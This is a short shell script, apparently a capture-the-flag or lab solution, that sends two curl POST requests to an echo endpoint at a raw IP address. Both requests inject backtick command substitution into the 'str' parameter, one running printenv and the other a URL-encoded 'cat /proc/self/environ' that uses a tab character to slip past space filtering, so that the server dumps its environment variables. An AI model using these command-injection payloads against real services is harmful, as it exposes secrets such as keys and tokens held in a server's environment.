#!/bin/sh
curl -X POST http://34.146.112.223:41323/echo \
  --data-urlencode "str=\`printenv\`"

curl -X POST http://34.146.112.223:41323/echo \
  --data "str=%60cat%09%2Fproc%2Fself%2Fenviron%60"
